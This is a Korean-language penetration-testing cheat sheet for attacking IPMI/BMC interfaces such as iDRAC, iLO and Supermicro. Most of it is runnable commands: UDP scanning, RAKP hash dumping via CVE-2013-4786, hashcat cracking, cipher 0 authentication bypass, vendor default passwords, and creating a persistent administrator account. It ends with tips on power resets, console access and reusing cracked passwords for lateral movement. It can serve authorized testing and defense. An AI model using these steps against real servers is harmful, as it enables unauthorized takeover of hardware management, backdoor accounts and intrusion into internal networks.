# IPMI

# IPMI (623/udp)

IPMI(Intelligent Platform Management Interface)는 서버의 BMC(Baseboard Management Controller)를 OS 와 무관하게 원격 관리하는 프로토콜. HP iLO, Dell iDRAC, Supermicro 같은 관리 칩이 623/udp 로 노출된다. BMC 는 메인보드에 붙은 독립 컴퓨터라, 여기를 장악하면 전원 제어, 콘솔 접근, 사실상 호스트 전체에 영향을 준다. 핵심 취약점은 RAKP 인증 과정에서 비밀번호 해시가 인증 완료 전에 유출되는 것(CVE-2013-4786)으로, 해시를 받아 오프라인 크랙하는 게 정석 공격이다.

---

## 1. 열거

623 은 UDP 라 기본 TCP 스캔에 안 잡힌다. 반드시 UDP 로 스캔해야 발견된다. 벤더(iLO/iDRAC/Supermicro)를 식별하면 이후 기본 계정과 공격 분기가 정해진다.

```bash
# nmap (UDP 스캔 - 느리니 포트 지정)
nmap -sU -p 623 <IP>
nmap -sU -p 623 --script=ipmi-version <IP>

# Metasploit - 버전과 IPMI 2.0 지원 여부
msf6 > use auxiliary/scanner/ipmi/ipmi_version
msf6 > set RHOSTS <IP>
msf6 > run
```

버전 결과에서 IPMI 2.0 이면 RAKP 해시 덤프(2절)가 가능하다. 벤더는 응답 배너나 함께 열린 웹 포트(iLO 는 443, iDRAC 는 443/5900 등)로 판단한다.

---

## 2. 사용자 열거

RAKP 는 요청한 사용자명이 유효한지에 따라 응답이 달라진다. 유효 사용자명을 알아야 해시 덤프가 되므로, 벤더별 기본 사용자명부터 확인한다.

```bash
# 벤더별 기본 사용자명
#   Supermicro : ADMIN
#   Dell iDRAC : root
#   HP iLO     : Administrator
#   기타       : admin, USERID (IBM/Lenovo)

# ipmitool 로 사용자 목록 (유효 자격증명이 있을 때)
ipmitool -I lanplus -H <IP> -U <user> -P <password> user list
```

사용자명을 전혀 모르면, 다음 절의 dumphashes 가 기본 사용자명 목록을 자동으로 돌며 유효한 것을 찾아 해시까지 뽑아준다.

---

## 3. 브루트포스

IPMI 는 온라인 비밀번호 브루트포스가 비효율적이다. 계정 잠금이 걸릴 수 있고 UDP 라 느리다. 대신 RAKP 해시를 뽑아 오프라인으로 크랙하는 게 정석이다 (4-5절). 오프라인이라 잠금도 없고 속도도 자유롭다.

```bash
# 빠른 우선 시도 - 기본 자격증명 (브루트포스보다 먼저)
ipmitool -I lanplus -H <IP> -U ADMIN -P ADMIN user list      # Supermicro
ipmitool -I lanplus -H <IP> -U root -P calvin user list      # Dell iDRAC

# 굳이 온라인 시도를 한다면 msf dumphashes 가 사전 크랙까지 겸한다 (아래 4절)
# 순수 로그인 브루트포스 도구(hydra 등)는 IPMI 지원이 약해 권장하지 않음
```

---

## 4. 해시 덤프 (CVE-2013-4786)

IPMI 2.0 의 RAKP 프로토콜은 유효한 사용자명에 대해 비밀번호의 HMAC-SHA1 해시를 인증이 끝나기 전에 응답에 담아 보낸다. 사용자명만 유효하면 비밀번호 없이 해시를 받아낸다. 이게 IPMI 공격의 핵심이다.

```bash
# Metasploit - 해시 덤프
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 > set RHOSTS <IP>
msf6 > set OUTPUT_HASHCAT_FILE ipmi.hash    # hashcat 7300 포맷으로 저장 (사용자명 없이 salt:hash)
msf6 > run

# 주의: 저장 옵션 이름은 버전마다 다르다
#   OUTPUT_HASHCAT_FILE  - hashcat 용 (salt:hash)
#   OUTPUT_JOHN_FILE     - john 용
#   (구버전 문서의 OUTPUT_FILE 은 없을 수 있음 - show options 로 확인)
```

run 화면에도 결과가 `<user>:<salt>:<hash>` 형태로 찍힌다. 맨 앞 user 는 사람이 보기 쉬우라고 붙은 라벨이고, 사용자명 자체는 salt 안에 16진수로 이미 포함돼 있다 (salt 끝의 61646d696e = "admin").

---

## 5. 해시 크랙

덤프한 해시는 hashcat 모드 7300(IPMI2 RAKP HMAC-SHA1)으로 크랙한다. 7300 입력 형식은 `<salt>:<hash>` 두 칸이다. run 화면 출력을 복사했다면 맨 앞 `<user>:` 를 반드시 떼야 한다. 안 그러면 칸이 세 개가 돼서 "Token length exception" 이 난다. OUTPUT_HASHCAT_FILE 로 저장한 파일은 이미 user 가 빠져 있어 그대로 쓰면 된다.

```bash
# 화면에서 복사한 경우 - 맨 앞 user: 제거하고 저장
echo '<salt>:<hash>' > ipmi.hash

# 크랙
hashcat -m 7300 ipmi.hash /usr/share/wordlists/rockyou.txt

# HP iLO 기본 비밀번호는 8자리 대문자+숫자 - 마스크가 사전보다 빠르다
hashcat -m 7300 ipmi.hash -a 3 -1 ?u?d ?1?1?1?1?1?1?1?1
```

## 6. cipher 0 인증 우회

cipher 0 이 허용된 BMC 는 비밀번호 검증 자체를 건너뛴다. 아무 비밀번호나 넣어도 인증이 통과해, 해시 크랙 없이 바로 장악할 수 있다.

```bash
# Metasploit - cipher 0 취약 여부 확인
msf6 > use auxiliary/scanner/ipmi/ipmi_cipher_zero
msf6 > set RHOSTS <IP>
msf6 > run

# ipmitool 로 cipher 0 악용 (-C 0), 비밀번호 자리는 아무 값
ipmitool -I lanplus -C 0 -H <IP> -U <user> -P anything user list
```

---

## 7. 인증 후 활용 (ipmitool)

자격증명을 확보하면(크랙/기본값/cipher 0) ipmitool 로 계정을 조회하고, 새 관리자 계정을 만들어 BMC 를 영구 장악한다.

```bash
# 계정 목록과 권한 확인
ipmitool -I lanplus -H <IP> -U <user> -P <password> user list

# 새 계정 생성 (빈 슬롯 ID 를 user list 에서 확인 후 사용, 예: 3)
ipmitool -I lanplus -H <IP> -U <user> -P <password> user set name 3 <newuser>
ipmitool -I lanplus -H <IP> -U <user> -P <password> user set password 3 <newpass>

# 관리자 권한 부여 (channel 1, privilege=4=Administrator)
ipmitool -I lanplus -H <IP> -U <user> -P <password> channel setaccess 1 3 link=on ipmi=on callin=on privilege=4
ipmitool -I lanplus -H <IP> -U <user> -P <password> user enable 3

# 권한 레벨: 1=Callback 2=User 3=Operator 4=Administrator 5=OEM 15=No access
# USER 권한 계정으로 붙을 때 "privilege level exceeds limit" 나면 -L USER 추가
```

### 전원 제어 / 시리얼 콘솔

```bash
# 전원 상태와 제어
ipmitool -I lanplus -H <IP> -U <user> -P <password> power status
ipmitool -I lanplus -H <IP> -U <user> -P <password> power reset

# SOL(Serial Over LAN) 콘솔 - 호스트 부팅/BIOS 접근 가능
ipmitool -I lanplus -H <IP> -U <user> -P <password> sol activate
```

---

## 8. 기본 자격증명 / 벤더별 특이점

```bash
#   Dell iDRAC    : root / calvin
#   HP iLO        : Administrator / <라벨의 8자리 랜덤>
#   Supermicro    : ADMIN / ADMIN
#   IBM/Lenovo IMM: USERID / PASSW0RD (숫자 0)
#   일반          : admin / admin
```

- iDRAC root/calvin 은 교체 안 하고 쓰는 현장이 아직 많다
- Supermicro 는 cipher 0 과 dumphashes 양쪽에 취약한 모델이 많다

---

## 9. 횡이동 관점

- BMC 에서 크랙한 비밀번호가 호스트 OS 의 SSH, 웹 관리자, AD 계정에 재사용되는 경우가 매우 흔하다. 반드시 다른 서비스에 재시도할 것
- SOL 콘솔로 호스트를 재부팅시켜 부트로더/싱글유저 모드로 진입하거나, 가상 미디어로 ISO 를 마운트해 호스트 OS 를 직접 건드리는 경로가 있다
- BMC 는 보통 관리 전용 내부망에 있어, 여기를 거점으로 내부망 피벗이 가능하다

---

## 팁

- 623 은 UDP 다. -sU 로 따로 스캔하지 않으면 존재 자체를 놓친다
- IPMI 의 본질적 무기는 온라인 브루트포스가 아니라 RAKP 해시 덤프(비번 불필요) + 오프라인 크랙이다
- dumphashes 는 유효 사용자명이 전제다. 벤더 기본 사용자명(ADMIN/root/Administrator)부터
- cipher 0 이 열려 있으면 크랙도 필요 없이 즉시 장악 - 스캔 시 항상 같이 확인할 것
- 크랙/확보한 비번은 거의 항상 횡이동에 재사용 시도할 가치가 있다
